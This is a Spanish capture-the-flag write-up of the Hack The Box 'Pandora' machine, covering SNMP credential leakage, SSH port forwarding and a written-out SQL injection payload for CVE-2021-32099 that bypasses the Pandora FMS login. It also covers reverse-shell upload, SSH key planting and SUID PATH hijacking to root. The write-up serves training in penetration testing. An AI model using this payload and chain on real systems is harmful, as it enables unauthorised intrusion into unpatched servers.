---
title: Pandora
published: true
categories: [Linux, Easy]
tags: [Web explotation, SNMP, SQLi, File upload, SUID abuse]
author: Kripteria
image:
  path: https://user-images.githubusercontent.com/55555187/155514659-187ffc2b-f8eb-48c0-ac7b-07d17dd228d2.png
  lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA

---

Pandora es una <font color="#98E256">máquina Easy</font> con temática <font color="#D35400">Linux</font> en la que se toca enumeración y fuzzing de un servicio web, escaneo de puertos por UDP, explotación del servicio SNMP para listar información interna, port forwarding, pivoting, SQL Inyection para bypassear un login, subida insegura de archivos y abuso de privilegio SUID.

## Reconocimiento

### Nmap

Una vez que la máquina está activa empezamos la fase de reconocimiento de puertos con nmap.

Identificamos los puertos abiertos de la máquina.

```
nmap -p- --open -sS --min-rate 10000 -Pn -n -vvv 10.10.11.136 -oN portScan
```

Obteniendo:

![recon1](https://user-images.githubusercontent.com/55555187/154847736-8dd6cd9a-c4e9-478f-942e-a9c4832b206f.PNG)

Identificamos la versión y el servicio corriendo en los puertos reportados en el escaneo anterior.

```
nmap -sVC -p22,80 10.10.11.136 -oN portSV 
```

Obteniendo:

![recon2](https://user-images.githubusercontent.com/55555187/154847738-e1191856-4cb5-4ad7-bb4d-95f629a5b961.PNG)

### Whatweb

Whatweb es una utilidad que nos permite identificar las tecnologías web utilizadas en una página web.

Sabiendo que la máquina tiene un servicio web alojado en el puerto 80 (HTTP) utilizaremos whatweb para obtener información de las tecnologías web que utilizan.

```
whatweb 10.10.11.136
```

Obteniendo:

<img src="https://user-images.githubusercontent.com/55555187/154847739-703a0f98-c17c-4435-ae68-95019ae023e7.PNG" title="" alt="recon3" width="676">

Obtenemos 2 correos que guardaré por si son útiles más adelante.

```
contact@panda.htb
support@panda.htb
```

Y según whatweb es probable que estemos ante un wordpress.

Para confirmarlo intento acceder a directorios típicos de wordpress como */wp-content/  /wp-includes/* o la página de login pero no parece ser un wordpress.

### Reconocimiento del contenido de la web

Una vez he añadido panda.htb a fichero **/etc/hosts** me dispongo a revisar el contenido de la web.

Lo único medianamente interesante que nos encontramos es el siguiente formulario de contacto:

<img src="https://user-images.githubusercontent.com/55555187/154847741-eb8a0472-d9a2-47e5-beba-c92a073335fb.PNG" title="" alt="recon4" width="311">

Pero si enviamos un mensaje y lo interceptamos con burpsuite (o simplemente miramos la actividad de red de la web con f12) vemos que lo está mandado como petición GET que no llega a ningún lado.

### Búsqueda de directorios

#### http-enum de nmap

Antes de lanzar escaneos con wfuzz o gobuster siempre lanzo el script de enumeración de nmap ya que a veces reporta cosas interesantes y supone una menor carga de peticiones para el servidor.

```
nmap -script http-enum http://panda.htb
```

En este caso no reporta nada.

#### wfuzz

Viendo que de momento no tenemos ningún posible vector de entrada empiezo a buscar directorios con **wfuzz**. Primero lanzo un reconocimiento básico:

```
wfuzz -c --hc=404,403 -t 500 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt http://panda.htb/FUZZ
```

Descubrimos el directorio /assets:

<img src="https://user-images.githubusercontent.com/55555187/154847742-e4fc6321-a736-4698-bc16-54e3b662f49f.PNG" title="" alt="recon5" width="325">

Pero por desgracia no contiene nada interesante.

Aplicamos un **doble fuzzer** tanto a la dirección http<span>://</span>panda.htb como a la dirección http<span>://</span>panda.htb/assets para identificar posibles archivos ocultos.

1 - Creamos un archivo extensiones.txt que contenga las extensiones que queremos buscar (php, html, pdf, sh, cgi, txt, pdf, bak,...).

2- Aplicamos fuzzing usando el directorio anterior y el de extensiones:

```
wfuzz -c --hc=404,403 -t 500 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -w extensiones.txt http://panda.htb/FUZZ.FUZ2Z
```

```
wfuzz -c --hc=404,403 -t 500 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -w extensiones.txt http://panda.htb/access/FUZZ.FUZ2Z
```

Pero no obtenemos nada útil.

### Más enumeración

#### Nikto

Viendo que no encontraba nada decidí lanzar **nikto** sobre el puerto 80 para ver si me reportaba algo.

```
nikto -h http://panda.htb
```

Pero no reportó nada.

#### Búsqueda de puertos UDP con Nmap

Viendo que no encontraba nada me acordé de que no había lanzado un escanéo por UDP para ver si había algún puerto abierto por lo que decidí lanzarlo.

```
nmap -sU http://panda.htb
```

Este tipo de escaneo tarda un rato, se puede acelerar mediante la siguiente opción:

```
nmap -sU -T5 http://panda.htb
```

E incluso más con la siguiente opción:

```
nmap -sU -T5 --max-retries max-tries -v http://panda.htb
```

Pero también hace que la fiabilidad del escaneo sea menor (nmap -sU http<span>://</span>panda.htb es equivalente a nmap -sU -T3 http<span>://</span>panda.htb).

Una vez finalizado el escaneo obtenemos lo siguiente: 

![recon6](https://user-images.githubusercontent.com/55555187/154847744-9458d4b2-bc5d-4af1-80f2-3480f6366ee9.PNG)

## Acceso al sistema

**snmp** **(Simple Network Management Protocol)** es un protocolo que se utiliza para facilitar el intercambio de información de administración entre dispositovos de red.

La vulnerabilidad de este protocolo es que la autenticación (hasta la versión 3) se realiza a través de una **community string** (una cadena de carácteres) en texto plano.

Por defecto las community strings suelen ser "public" o "private".



Lanzo snmp-check con la community string "public" y la versión 2c

```
snmp-check -c public -v 2c 10.10.11.136
```

Obteniendo información del sistema, interfaces de las interfaces, puertos abiertos, procesos, software instalado...

Si nos fijamos en los procesos de la máquina podemos ver un usuario y contraseña.

![acc1](https://user-images.githubusercontent.com/55555187/155106052-f6e2f173-506a-4d5b-9895-902785c28c96.PNG)

```
usuario: daniel
contraseña: HotelBabylon23
```

Probamos a iniciar sesión a través de ssh y obtenemos acceso al sistema.

![acc2](https://user-images.githubusercontent.com/55555187/155106058-140ce307-2b4e-4855-a831-8e2b7671f410.PNG)

Una vez que hemos accedido al sistema hacemos un reconocimiento básico:

- Mediante el comando **id** miramos si estamos en algún grupo interesante.

- Utilizando **sudo -l** comprobamos si tenemos permisos de sudo en algún contexto.

- Con **find / -perm /4000 2>/dev/null** comprobamos si existe *permisos SUID* que podamos explotar.

- Miramos la versión del kernel mediante **uname -a** para ver si es vulnerable a *dirty cow*.

Lo primero que observamos nada más entrar a la máquina y movernos un poco es que  daniel no es el único usuario, también existe el usuario **matt** que es quien tiene la flag por lo que **tendremos que hacer pivoting**.

Con el reconocimiento básico observamos que el **fichero pandora_backup** tiene **permisos SUID** que quizás más adelante nos es útil ya que tenemos que ser matt para poder leerlo.

<img src="https://user-images.githubusercontent.com/55555187/155107666-a40ec389-07cf-43fa-9a86-f1445f6f35ac.PNG" title="" alt="piv1" width="404">

Lanzamos **pspy**  para identificar posibles tareas Cron ejecutándose en el sistema, pero no obtenemos nada.

Miramos el directorio **./ssh** de daniel por si tuviese **authorized_keys** que pudiésemos usar para escalar privilegios o hacer pivoting a matt pero no obtenemos nada.

Observo que en el directorio **var/www/** existe un directorio llamado **/pandora** que a su vez tiene dentro un directorio **pandora_console/** lo que me hace sospechar que quizás hay una web alojada en algún sitio.

![piv2](https://user-images.githubusercontent.com/55555187/155107667-0001c94d-2b23-4306-a554-d638c247a55e.PNG)

Miro el fichero **/etc/hosts** y observo que parece que se está alojando un servicio en localhost.

<img src="https://user-images.githubusercontent.com/55555187/155107673-d52f8607-9629-40e7-a387-ccbcdae30db0.PNG" title="" alt="piv3" width="579">

Lanzo un **port forwarding** por ssh para poder visualizar el contenido de localhost en mi equipo.

```
ssh -L 8888:127.0.0.1:80 -N daniel@10.10.11.136
```

-L : especifica que vamos a hacer port forwarding de la dirección 127.0.0.1:80 del equipo daniel@<span>10.10.11.136</span> a nuestro puesto 8888.

-N: indica que no queremos que nos dé una terminal al conectarnos.

## Pivoting hacia el usuario matt

Si vamos a la dirección 127.0.0.1<span>:8888</span> de nuestra máquina observamos lo siguiente:

![piv4](https://user-images.githubusercontent.com/55555187/155370572-03278394-7555-48a8-bd16-58c4be013a12.PNG)

En la parte inferior de la web observamos la versión del servicio Pandora FMS que está usando la máquina.

Intento reutilizar las credenciales de daniel pero me salta un mensaje indicando que los usuarios deben hacer login a través de la API.

Aprovechándome de que sé la versión del servicio, busco potenciales exploits.

Tras investigar encuentro que la versión de Pandora FMS que está usando la máquina tiene varios vectores potenciales de ataque, entre ellos, el [CVE-2021-32099](https://blog.sonarsource.com/pandora-fms-742-critical-code-vulnerabilities-explained) que permite bypassear el login mediante una **inyección SQL** en la siguiente ruta:

```
http://127.0.0.1:8888/pandora_console/include/chart_generator.php
```

Compruebo que no esté parcheado para esta máquina:

![piv5](https://user-images.githubusercontent.com/55555187/155363883-d3303acf-ae2b-460d-a5c2-bcaee83679cd.PNG)

Una vez que he comprobado que el vector de acceso sigue existiendo, pruebo con varias inyecciones SQL pero no me reportan nada útil.

Accedo como el usuario Daniel a la máquina para ver si en el directorio pandora_console puedo encontrar algún archivo php con la información de las tablas de la db pero no encuentro nada.

Finalmente encuentro en Github unos repositorios con **Proof of concept** de como explotar la vulnerabilidad correctamente:

<img src="https://user-images.githubusercontent.com/55555187/155363885-2075997d-6348-4ec0-aedb-1e448e120776.PNG" title="" alt="piv6" width="402">

```
http://127.0.0.1:8888/pandora_console/include/chart_generator.php?session_id=a' UNION SELECT 'a',1,'id_usuario|s:5:"admin";' as data FROM tsessions_php WHERE '1'='1
```

Una vez explotada la vulnerabilidad recargo la página y logro **bypassear el login** y acceder al portal como admin.

<img title="" src="https://user-images.githubusercontent.com/55555187/155363890-fb3e170b-a4a7-490f-8204-60f1f879a426.PNG" alt="piv8" width="646">

Una vez aquí y habiendo leído que esta versión de Pandora FMS también es vulnerable al [CVE 2020-7935](https://nvd.nist.gov/vuln/detail/CVE-2020-7935) busco vias potenciales de subir un archivo desde el portal y las encuentro:

<img src="https://user-images.githubusercontent.com/55555187/155369004-f5f33659-6da5-428d-9b32-6ca7560f878b.PNG" title="" alt="piv12" width="484">

Observo que los archivos parecen guardarse en el directorio /images/ por lo que creo el directorio "NotSus" y subo un [archivo php](https://github.com/pentestmonkey/php-reverse-shell) que me entablará una reverse shell cuando se abra:

<img src="https://user-images.githubusercontent.com/55555187/155368823-c43feeb2-5a06-4b96-98c6-02e28f800fb3.PNG" title="" alt="piv10" width="503">

Accedo a la ubicación del archivo (también se podría hacer usando curl) y lo abro para entablarme la **reverse shell**:

<img title="" src="https://user-images.githubusercontent.com/55555187/155368824-8ba05753-2403-4dc9-a4f9-9e26ba683012.PNG" alt="piv11" width="519">

<img src="https://user-images.githubusercontent.com/55555187/155368817-e2e16c8a-b60a-42ef-ac65-7601e75a2ac5.jpg" title="" alt="piv12 PNG" width="484">

### Tratamiento de la tty

Realizo un tratamiento de la tty para tener una shell interactiva y en la que pueda trabajar cómodamente. Para ello lanzo los siguientes comandos:

#### Tratamiento básico

```
script /dev/null -c bash
ctrl + z
stty raw -echo; fg
reset
xterm
export XTERM=xterm
export SHELL=bash
```

#### Escalado de editores de texto

```
stty -a (En una terminal de nuestro equipo para ver los valores de 
            columns y rows)

stty rows [rows] columns [columns]
```

Esto último es para que al abrir nano o algún editor en la máquina víctima nos salga bien escalado en la terminal.

## Escalado de privilegios

Ya que somos matt y podemos ejecutar el archivo **pandora_backup** alojado en **/usr/bin** con permisos SUID lo primero que hago es ejecutarlo para ver lo que hace.

![privesc1](https://user-images.githubusercontent.com/55555187/155500466-f7d4fe8b-f0ab-4712-b89b-ecdc8c1b495a.PNG)

Al parecer está usando **tar** para descomprimir un archivo que se encuentra en el directorio /root/ pero falla por falta de permisos.

Tras investigar posibles formas de explotar esto se me ocurre intentar hacer un **path hijacking** para que el archivo ejecute un archivo tar envenenado.

![privesc2](https://user-images.githubusercontent.com/55555187/155500464-4ff460ae-d7d6-4cec-bba5-d8c2065462ec.PNG)

Pero no logro obtener root.



Trás investigar y gracias al consejo de un miembro de la comunidad H4ckNet decido intentar repetir el ataque a través de ssh.

Como no sé la contraseña de matt lo que hago es **autorizarme a través del archivo authorized_keys** de la siguiente forma:

1- Creo el directorio **.ssh** y el fichero **authorized_keys** con los permisos necesarios (es importante que sean estos permisos).

<img src="https://user-images.githubusercontent.com/55555187/155502171-005546e6-1f3d-4ef0-911c-15248177715a.png" title="" alt="root3" width="534">

2- Creo un par de claves **id_rsa**, **id_rsa.pub** con el comando **ssh-keygen**.

<img src="https://user-images.githubusercontent.com/55555187/155505088-f6744530-7437-4af2-afb2-34c4daabe85e.PNG" title="" alt="root2" width="541">

3- Copio la clave id_rsa.pub en authorized_keys.

4- Accedo por ssh como matt.

<img src="https://user-images.githubusercontent.com/55555187/155505159-0f832071-b7d4-4185-90e5-6e41ed02a3ea.PNG" title="" alt="root4" width="415">



Una vez dentro compruebo si el archivo pandora_backup se comporta de forma diferente:

<img src="https://user-images.githubusercontent.com/55555187/155505217-45c19d7c-0790-4f3f-bb16-d82075c4d509.PNG" title="" alt="root5" width="568">

Una vez visto que el archivo si que logra descomprimir el fichero del directorio /root/ vuelvo a probar el **path hijacking**.

![root6](https://user-images.githubusercontent.com/55555187/155507290-381442a5-82b0-4980-bbb3-11a511722b54.PNG)

Y esta vez si que obtenemos root.

Esto puede ocurrir debido a que la máquina esté securizada de tal forma que el archivo solo se pueda ejecutar mediante una sesión ssh ya que ofrece una mayor seguridad que una tty normal.
